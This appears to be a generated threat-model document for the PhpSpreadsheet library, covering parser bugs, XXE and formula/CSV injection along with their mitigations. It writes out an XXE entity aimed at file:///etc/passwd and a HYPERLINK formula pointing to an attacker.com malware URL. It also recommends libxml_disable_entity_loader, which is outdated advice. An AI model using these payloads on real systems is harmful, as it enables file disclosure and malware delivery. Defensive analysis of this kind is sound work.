# Attack Surface Analysis for phpoffice/phpspreadsheet

## Attack Surface: [Maliciously Crafted Spreadsheet Files (Parsing Vulnerabilities)](./attack_surfaces/maliciously_crafted_spreadsheet_files__parsing_vulnerabilities_.md)

*   **Description:** Exploitation of vulnerabilities in PhpSpreadsheet's file format parsers (XLSX, XLS, CSV, ODS, etc.) through specially crafted input files. This is the core, direct attack surface of the library.
*   **How PhpSpreadsheet Contributes:** PhpSpreadsheet *is* the code that parses these files. Any bugs in its parsing logic are directly exploitable.
*   **Example:** An attacker uploads a crafted XLSX file with a malformed XML structure that triggers a buffer overflow or an integer overflow in the XLSX parser, leading to remote code execution. Or, a crafted CSV with an extremely large number of rows/columns to cause a denial of service.
*   **Impact:**
    *   Remote Code Execution (RCE) - *Critical*
    *   Denial of Service (DoS) - *High*
    *   Information Disclosure (less likely, but possible) - *High*
*   **Risk Severity:** Critical to High
*   **Mitigation Strategies:**
    *   **Input Validation:** Strictly validate file types and enforce maximum file size limits. Do *not* rely solely on file extensions.
    *   **Regular Updates:** Keep PhpSpreadsheet and all its dependencies (especially `libxml2`, `ext-zip`) updated to the latest versions. This is the *most important* mitigation.
    *   **Fuzz Testing:** Conduct regular fuzz testing of the various file format parsers. This is a proactive measure to find vulnerabilities before attackers do.
    *   **Least Privilege:** Run the application with the lowest possible privileges.
    *   **Sandboxing/Containerization:** Isolate the application.
    *   **Disable Unused Parsers:** If possible, disable support for unneeded file formats.
    *   **WAF (Web Application Firewall):** Can provide some protection, but is not a primary defense.

## Attack Surface: [XML External Entity (XXE) Injection](./attack_surfaces/xml_external_entity__xxe__injection.md)

*   **Description:** Exploitation of insecure XML parsing in the XLSX reader. Attackers inject external entities to access local files, internal network resources, or cause DoS. This is a specific, high-impact vulnerability type within the broader parsing vulnerability category.
*   **How PhpSpreadsheet Contributes:** PhpSpreadsheet uses an XML parser (likely `libxml2` via PHP's XML extensions) to process XLSX files. The vulnerability exists if this parser is misconfigured.
*   **Example:** An attacker uploads an XLSX file with an XML entity referencing `file:///etc/passwd` or a remote DTD that causes a denial of service.
*   **Impact:**
    *   Local File Disclosure - *High*
    *   Server-Side Request Forgery (SSRF) - *High*
    *   Denial of Service (DoS) - *High*
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   **Disable External Entities:** *Crucially*, disable the loading of external entities in the XML parser using `libxml_disable_entity_loader(true);` *before* any PhpSpreadsheet calls that process XLSX files. This is the primary and most effective mitigation.
    *   **Use a Safe XML Parser Configuration:** If external entities are absolutely required (highly discouraged), use a secure configuration with strict restrictions.
    *   **Input Validation:** While not the primary defense, validating the XLSX structure *before* parsing can help detect some malicious attempts.

## Attack Surface: [Formula Injection (including CSV Injection)](./attack_surfaces/formula_injection__including_csv_injection_.md)

*   **Description:** Injection of malicious formulas into any supported spreadsheet format (including CSV) that are executed when the file is opened in a spreadsheet program.
*   **How PhpSpreadsheet Contributes:** PhpSpreadsheet is used to *generate* the spreadsheet file. If the application using PhpSpreadsheet doesn't properly sanitize user input before writing it to the file, the vulnerability is created.
*   **Example:** An attacker provides input containing `=HYPERLINK("http://attacker.com/malware.exe","Click Me")` which is written directly to a cell without escaping.
*   **Impact:**
    *   Execution of arbitrary code on the *user's* machine (client-side) - *High*
    *   Phishing attacks - *High*
    *   Data exfiltration - *High*
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   **Data Sanitization:** *Always* escape special characters (especially `=`, `+`, `-`, `@`, and tab/newline characters) in *any* user-provided data written to a spreadsheet file. Prepend a single quote (`'`) to cell values starting with these characters.
    *   **Content Security Policy (CSP):** If the generated file is opened in a web browser, use a strong CSP.
    *   **Educate Users:** Inform users about the risks.
    *   **Avoid Direct User Input in Formulas:** If possible, avoid using user input directly within formulas. Use whitelisting if necessary.

